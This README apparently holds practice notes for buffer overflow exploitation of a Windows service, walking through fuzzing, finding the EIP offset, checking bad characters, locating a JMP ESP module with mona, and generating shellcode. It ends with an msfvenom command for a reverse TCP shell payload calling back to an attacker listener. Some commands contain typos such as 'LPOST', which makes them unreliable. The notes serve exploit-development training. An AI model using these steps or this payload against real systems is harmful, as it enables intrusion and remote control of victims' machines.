# Buffer Overflow Scripts
Buffer overflow scripts to practice (walkthrough notes)

## 1- Spiking (finding the vulnerable server -crashable service-)

use the command "`generice_send_tcp HOST PORT`" in Kali Linux

Make a file named after the service with the extension of .spk for spike.

>e.g. trun.spk

run `generic_send_tcp <IP> <PORT> trun.spk 0 0` 

if it crashes, then this is our service. 

_____________________________________________________


## 2- Fuzzing (overloading the service and identify the number of bytes it takess to crash it)

here we will use the `fuzzer.py`

>Make sure you edit the IP and PORT

You will get a number of bytes _-where the program crashed-_, then you will used to generate a pattern with `msf-pattern_create` in Kali.
>the -l (Capital L) switch takes the number of bytes.
>e.g. `msf-pattern_create -l 3000`


_____________________________________________________________

## 3- Finding the Offset (EIP)
after editing the offset and firing up the `offset.py`, to identify the overwritten EIP we have to take the hex for it. then we will use it with `msf-pattern_offset -l <BYTES> -q <EIP's HEX>`.

the offset will come up, and that what we are gonna use to overwrite the EIP.
_____________________________________________________________

## 4 - Overwriting the EIP (Just to make sure that we made it right)

We will make sure here we wrote the EIP with `eip_set.py`

if the last bytes(of EIP) were Bs _-42424242-_ then we overwrote the EIP successfully.

_____________________________________________________________


## 5 - f  Finding Bad Characters

here we will try to identify which characters are bad for the shellcode (breaks the code), in order to avoid them. 


run the code `badchars.py`

then follow the ESP in dump and see if there's any badchars (Something that doesn't belong to the hex order).

_____________________________________________________________


## 6- Finding the Right Module (The vulnerable Service)

from github download mona.py and leave it at "C:\programfiles(x86)\immunityinc\immunitydebugger\pycommands"

in the little bar down the Immunity Debugger type: *!mona modules*

notice the falses in the security for the specific service.

locate nasm_shell in linux (this translate the instruction you write into assembly code), it is used to direct the malicious code to be executed. 

type in nasm_shell: JMP ESP 

then in the bar in Immunity Debugger type: 
`!mona find -s "\xff\xe4" -m <vuln service>`

>-m switch is the vulnerable module we identified earlier with !mona modules

then run `module_finder.py`
_____________________________________________________________


## 7- Generating Shellcode and Gaining Root

generate a payload with msfvenom in Kali
`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.5.108 LPOST=9999 EXITFUNC=thread -f c -a x86 -b "\x00"`
>-f switch for format,
>-a switch for architechture,
>-b switch for bad characters.

copy the payload to `shellcode.py` and fire it up. 

Enjoy your shell!
